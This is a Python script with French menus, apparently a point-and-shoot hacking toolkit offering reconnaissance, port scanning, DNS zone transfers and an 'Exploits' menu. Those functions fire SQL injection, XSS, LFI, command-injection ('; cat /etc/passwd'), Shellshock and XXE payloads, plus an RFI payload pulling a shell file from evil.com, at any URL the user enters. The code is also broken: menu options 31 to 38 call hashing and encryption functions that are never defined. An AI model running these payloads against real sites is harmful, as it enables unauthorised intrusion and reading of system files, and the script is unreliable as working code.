#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from colorama import Fore, Style, init
init(autoreset=True)
import socket
import requests
import whois
import hashlib
import base64
import sys  
import re
import json
import urllib.parse
from urllib.parse import urljoin
from bs4 import BeautifulSoup
import threading
import time
import subprocess
import ipaddress
import os

# Initialisation Colorama
init(autoreset=True)

def gradient_text(text, start_color, end_color):
    def interpolate(start, end, factor):
        return int(start + (end - start) * factor)

    gradient_output = ''
    lines = text.splitlines()
    total_chars = sum(len(line.replace(' ', '')) for line in lines)  # Ignore les espaces pour le dégradé
    char_index = 0

    for line in lines:
        for char in line:
            if char == ' ':
                gradient_output += ' '
                continue
            factor = char_index / total_chars if total_chars else 0
            r = interpolate(start_color[0], end_color[0], factor)
            g = interpolate(start_color[1], end_color[1], factor)
            b = interpolate(start_color[2], end_color[2], factor)
            gradient_output += f'\033[38;2;{r};{g};{b}m{char}\033[0m'
            char_index += 1
        gradient_output += '\n'
    return gradient_output

def banner():
    os.system('cls' if os.name == 'nt' else 'clear')

    ascii_art = r"""
 _     ____  _  ____   ___  _   _____ _        ____   _____   ___   _
/ \ |\/  _ \/ \/  _ \  \  \//  /  __// \__/| /  __ \ /_   _\ \   \ / /
| | //| / \|| || | \|   \  /   |  \  | |\/|| |  \/ |  /  \    \     / 
| \// | \_/|| || |_/|   /  \   |  /_ | |  || |  __/   |  |    /    /  
\__/  \____/\_/\____/  /__/\\  \____\\_/  \| \_/      \__/   /____/
"""

    start_rgb = (0, 0, 255)   # Bleu
    end_rgb = (255, 0, 255)   # Magenta

    gradient_banner = gradient_text(ascii_art, start_rgb, end_rgb)

    print(gradient_banner)

    time.sleep(1)

def gradient_menu(menu):
    start_rgb = (0, 0, 255)  # Bleu
    end_rgb = (255, 0, 255)  # Magenta
    return gradient_text(menu, start_rgb, end_rgb)

# Fonctions Reconnaissance
def whois_lookup():
    target = input("Domaine cible : ")
    print(whois.whois(target))

def dns_resolver():
    target = input("Domaine cible : ")
    print(socket.gethostbyname(target))

def reverse_ip():
    ip = input("IP cible : ")
    url = f"https://api.hackertarget.com/reverseiplookup/?q={ip}"
    print(requests.get(url).text)

def subdomain_enum():
    domain = input("Domaine cible : ")
    subdomains = ["www", "mail", "ftp", "admin"]
    for sub in subdomains:
        url = f"http://{sub}.{domain}"
        try:
            requests.get(url)
            print(f"[+] {url}")
        except:
            pass

def geoip_lookup():
    ip = input("IP cible : ")
    r = requests.get(f"https://geolocation-db.com/json/{ip}&position=true").json()
    print(json.dumps(r, indent=4))

def asn_lookup():
    ip = input("IP cible : ")
    url = f"https://api.hackertarget.com/aslookup/?q={ip}"
    print(requests.get(url).text)

def extract_emails():
    url = input("URL cible : ")
    r = requests.get(url)
    emails = set(re.findall(r"[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+", r.text))
    print("\n".join(emails))

def extract_links():
    url = input("URL cible : ")
    r = requests.get(url)
    soup = BeautifulSoup(r.text, "html.parser")
    for link in soup.find_all('a', href=True):
        print(urljoin(url, link['href']))

def header_grabber():
    url = input("URL cible : ")
    r = requests.get(url)
    print(r.headers)

def tech_scanner():
    url = input("URL cible : ")
    r = requests.get(url)
    headers = r.headers
    print(f"Server : {headers.get('Server')}")
    print(f"X-Powered-By : {headers.get('X-Powered-By')}")

# Scan & Enumeration
def port_scanner():
    target = input("Cible : ")
    ports = range(1, 1025)
    for port in ports:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.5)
        if s.connect_ex((target, port)) == 0:
            print(f"[+] Port {port} OUVERT")
        s.close()

def banner_grabbing():
    target = input("Cible : ")
    port = int(input("Port : "))
    s = socket.socket()
    s.connect((target, port))
    print(s.recv(1024).decode())

def subnet_calculator():
    subnet = input("CIDR (ex: 192.168.1.0/24): ")
    net = ipaddress.ip_network(subnet)
    for ip in net:
        print(ip)

def traceroute():
    host = input("Hôte cible : ")
    subprocess.call(["traceroute", host])

def zone_transfer():
    domain = input("Domaine cible : ")
    dns_server = input("DNS Server : ")
    try:
        result = subprocess.check_output(['dig', 'axfr', domain, f"@{dns_server}"])
        print(result.decode())
    except:
        print("Zone transfer failed.")

def open_redirect():
    url = input("URL vulnérable (ex: site.com/redirect.php?url=): ")
    payload = "https://evil.com"
    test_url = url + payload
    r = requests.get(test_url)
    if payload in r.url:
        print("[+] Vulnérable à l'Open Redirect")
    else:
        print("[-] Non vulnérable")

def dir_brute():
    target = input("Site cible : ")
    paths = ["admin", "login", "dashboard"]
    for path in paths:
        url = f"http://{target}/{path}"
        r = requests.get(url)
        if r.status_code == 200:
            print(f"[+] {url} trouvé !")

def admin_page_finder():
    dir_brute()

def robots_txt():
    site = input("Site cible : ")
    url = f"http://{site}/robots.txt"
    r = requests.get(url)
    print(r.text if r.status_code == 200 else "Pas trouvé")

def sitemap_finder():
    site = input("Site cible : ")
    url = f"http://{site}/sitemap.xml"
    r = requests.get(url)
    print(r.text if r.status_code == 200 else "Pas trouvé")

# Exploits
def sql_injection_tester():
    url = input("URL vulnérable (ex: site.com/page.php?id=1): ")
    payload = "' OR '1'='1"
    if "error" in requests.get(url + payload).text.lower():
        print("[+] Vulnérable à SQLi")
    else:
        print("[-] Non vulnérable")

def xss_payload_injector():
    url = input("URL vulnérable : ")
    payload = "<script>alert(1)</script>"
    r = requests.get(url + payload)
    if payload in r.text:
        print("[+] XSS trouvé")

def csrf_poc_gen():
    print("Exemple de PoC :\n<form action='http://target.com/change' method='POST'><input type='hidden' name='password' value='hacked'><input type='submit' value='Submit'></form>")

def lfi_tester():
    url = input("URL vulnérable : ")
    payload = "../../../../../../etc/passwd"
    r = requests.get(url + payload)
    if "root:" in r.text:
        print("[+] Vulnérable à LFI")

def rfi_tester():
    url = input("URL vulnérable : ")
    payload = "http://evil.com/shell.txt"
    r = requests.get(url + payload)
    if "shell" in r.text:
        print("[+] Vulnérable à RFI")

def cmd_injection():
    url = input("URL vulnérable : ")
    payload = "; cat /etc/passwd"
    r = requests.get(url + payload)
    if "root:" in r.text:
        print("[+] Vulnérable à Command Injection")

def shellshock_tester():
    url = input("URL cible : ")
    headers = {'User-Agent': '() { :;}; echo vulnerable'}
    r = requests.get(url, headers=headers)
    print("[+] Vulnérable à Shellshock" if "vulnerable" in r.text else "[-] Non vulnérable")

def ssrf_tester():
    url = input("URL vulnérable : ")
    payload = "http://127.0.0.1"
    r = requests.get(url + payload)
    print("[+] SSRF Possible" if "localhost" in r.text else "[-] Non vulnérable")

def xxe_tester():
    print("XXE Payload :\n<!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>")

def clickjacking_tester():
    url = input("URL cible : ")
    headers = requests.get(url).headers
    if 'X-Frame-Options' not in headers:
        print("[+] Vulnérable à Clickjacking")

# Interface Utilisateur avec le menu stylé
def main_menu():
    while True:
        menu = """
══════════════════════════════════════════════════════════════════
                       🔎 RECONNAISSANCE
══════════════════════════════════════════════════════════════════
[01] Whois Lookup                  [02] DNS Resolver
[03] Reverse IP Lookup             [04] Subdomain Enumeration
[05] GeoIP Lookup                  [06] ASN Lookup
[07] Extract Emails                [08] Extract Links
[09] Header Grabber                [10] Tech Scanner

══════════════════════════════════════════════════════════════════
                      ⚙️ SCAN & ENUMERATION
══════════════════════════════════════════════════════════════════
[11] Port Scanner                  [12] Banner Grabbing
[13] Subnet Calculator             [14] Traceroute
[15] Zone Transfer                 [16] Open Redirect
[17] Directory Brute Force         [18] Admin Page Finder
[19] Robots.txt Finder             [20] Sitemap Finder

══════════════════════════════════════════════════════════════════
                          💥 EXPLOITS
══════════════════════════════════════════════════════════════════
[21] SQL Injection Tester          [22] XSS Payload Injector
[23] CSRF PoC Generator            [24] LFI Tester
[25] RFI Tester                    [26] Command Injection Tester
[27] Shellshock Tester             [28] SSRF Tester
[29] XXE Tester                    [30] Clickjacking Tester

══════════════════════════════════════════════════════════════════
                   🔐 ENCODERS / DECODERS / HASHING
══════════════════════════════════════════════════════════════════
[31] Hash Identifier               [32] Hash Cracker
[33] Base64 Encoder                [34] Base64 Decoder
[35] URL Encoder                   [36] URL Decoder

══════════════════════════════════════════════════════════════════
                      🔒 CRYPTOGRAPHY
══════════════════════════════════════════════════════════════════
[37] AES Encryption                [38] DES Encryption

══════════════════════════════════════════════════════════════════
[00] Quit
"""
        print(gradient_menu(menu))

        option = input("\nSélectionne une commande : ").strip()

        if option == '1' or option == '01':
            whois_lookup()
        elif option == '2' or option == '02':
            dns_resolver()
        elif option == '3' or option == '03':
            reverse_ip()
        elif option == '4' or option == '04':
            subdomain_enum()
        elif option == '5' or option == '05':
            geoip_lookup()
        elif option == '6' or option == '06':
            asn_lookup()
        elif option == '7' or option == '07':
            extract_emails()
        elif option == '8' or option == '08':
            extract_links()
        elif option == '9' or option == '09':
            header_grabber()
        elif option == '10':
            tech_scanner()
        elif option == '11':
            port_scanner()
        elif option == '12':
            banner_grabbing()
        elif option == '13':
            subnet_calculator()
        elif option == '14':
            traceroute()
        elif option == '15':
            zone_transfer()
        elif option == '16':
            open_redirect()
        elif option == '17':
            dir_brute()
        elif option == '18':
            admin_page_finder()
        elif option == '19':
            robots_txt()
        elif option == '20':
            sitemap_finder()
        elif option == '21':
            sql_injection_tester()
        elif option == '22':
            xss_payload_injector()
        elif option == '23':
            csrf_poc_gen()
        elif option == '24':
            lfi_tester()
        elif option == '25':
            rfi_tester()
        elif option == '26':
            cmd_injection()
        elif option == '27':
            shellshock_tester()
        elif option == '28':
            ssrf_tester()
        elif option == '29':
            xxe_tester()
        elif option == '30':
            clickjacking_tester()
        elif option == '31':
            hash_identifier()
        elif option == '32':
            hash_cracker()
        elif option == '33':
            base64_encoder()
        elif option == '34':
            base64_decoder()
        elif option == '35':
            encode_url()
        elif option == '36':
            decode_url()
        elif option == '37':
            aes_encryption()
        elif option == '38':
            des_encryption()
        elif option == '0' or option == '00':
            print("Au revoir !")
            sys.exit()
        else:
            print("Option invalide. Réessaie !")
        
        input("\nAppuie sur Entrée pour revenir au menu...")
        banner()  # Pour réafficher le banner à chaque tour si tu veux
        
    # Ici tu mets la logique de dispatch de l'option (comme avant).

# Main
if __name__ == "__main__":
    banner()
    while True:
        main_menu()
